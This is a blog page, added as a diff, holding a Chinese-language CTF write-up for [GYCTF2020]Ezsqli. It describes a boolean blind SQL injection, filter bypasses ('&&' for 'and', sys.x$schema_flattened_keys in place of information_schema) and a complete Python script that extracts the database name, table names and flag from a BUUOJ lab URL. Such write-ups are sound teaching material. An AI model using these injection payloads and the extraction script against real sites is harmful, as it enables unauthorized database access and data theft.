@@ -1,0 +1,232 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[GYCTF2020]Ezsqli | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[GYCTF2020]Ezsqli</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/6
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606204511024.png" alt="image-20240606204511024"></p>
+<p>做这道题建议屏蔽图片，烦死了</p>
+<p>尝试了一下注入姿势</p>
+<p>发现回显一般只有两种</p>
+<p>Nu1L和Error Occured When Fetch Result.</p>
+<p>也就是如果true返回Nu1L，不是则返回后者</p>
+<p>很经典的布尔盲注题</p>
+<p>之后就是找找过滤</p>
+<p>and被过了</p>
+<p>我们可以使用&amp;&amp;代替</p>
+<p>同时information_schema和mysql.innodb_table_stats被ban了</p>
+<p>搜索后采用sys.x$schema_flattened_keys（仅限5.1以上版本）</p>
+<p>所以我们直接采用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def get_database(url,strings):</span><br><span class="line">    database_length = 1</span><br><span class="line">    DBname = &#x27;&#x27;</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;id&#x27;: &quot;1&amp;&amp;(length(database()))=&quot;+str(i)</span><br><span class="line">        &#125;</span><br><span class="line">        rs = requests.post(url,data)</span><br><span class="line">        if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">            database_length = i</span><br><span class="line">            print(&#x27;数据库长度为：&#x27;+str(database_length))</span><br><span class="line">            break</span><br><span class="line">    for i in range(1,database_length+1):</span><br><span class="line">        for one_char in strings:</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: &quot;1&amp;&amp;substr(database(),&quot; + str(i) + &quot;,1)=&#x27;&quot;+str(one_char)+&quot;&#x27;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            rs = requests.post(url,data)</span><br><span class="line">            if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">                DBname = DBname + one_char</span><br><span class="line">                print(&quot;\r&quot;, end=&quot;&quot;)</span><br><span class="line">                print(&#x27;正在获取数据库名称，当前已获取到&#x27;+str(i)+&#x27;位 | &#x27;+DBname.lower(), end=&#x27;&#x27;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def get_tablename(url,strings):</span><br><span class="line">    TBname = &#x27;&#x27;</span><br><span class="line">    print(&#x27;表名字读取中...&#x27;)</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for one_char in strings:</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: &quot;1&amp;&amp;substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&quot; + str(</span><br><span class="line">                    i) + &quot;,1)=&#x27;&quot;+str(one_char)+&quot;&#x27;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            time.sleep(0.05)</span><br><span class="line">            rs = requests.post(url,data)</span><br><span class="line">            if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">                TBname = TBname + one_char</span><br><span class="line">                print(&quot;\r&quot;, end=&quot;&quot;)</span><br><span class="line">                print(&#x27;表的名字为：&#x27; + TBname.lower(), end=&#x27;&#x27;)</span><br><span class="line">                break</span><br><span class="line">            if &#x27;Nu1L&#x27; not in rs.text and one_char == &#x27;~&#x27;:</span><br><span class="line">                return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def get_column(url,strings):</span><br><span class="line">    column_name = &#x27;&#x27;</span><br><span class="line">    tmp = &#x27;&#x27;</span><br><span class="line">    print(&#x27;\nflag信息读取中...&#x27;)</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for one_char in strings:</span><br><span class="line">            one_char = column_name + one_char</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;:&quot;1&amp;&amp;((select 1,&#x27;&quot;+str(one_char)+&quot;&#x27;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            time.sleep(0.05)</span><br><span class="line">            rs = requests.post(url,data)</span><br><span class="line">            if &#x27;Nu1L&#x27; not in rs.text:</span><br><span class="line">                tmp = one_char</span><br><span class="line">            if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">                column_name = tmp</span><br><span class="line">                print(&quot;\r&quot;, end=&quot;&quot;)</span><br><span class="line">                print(&#x27;flag为：&#x27; + column_name.lower(), end=&#x27;&#x27;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://0fe9c88f-4b11-44dc-8d0c-8a792f414c49.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line">    strings = &#x27;,-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&#x27;</span><br><span class="line">    get_database(url,strings)</span><br><span class="line">    get_tablename(url,strings)</span><br><span class="line">    #原来是想着获取column名称，但是未获取到，但是又懒得改名称，所以使用的是column</span><br><span class="line">    get_column(url,strings)</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
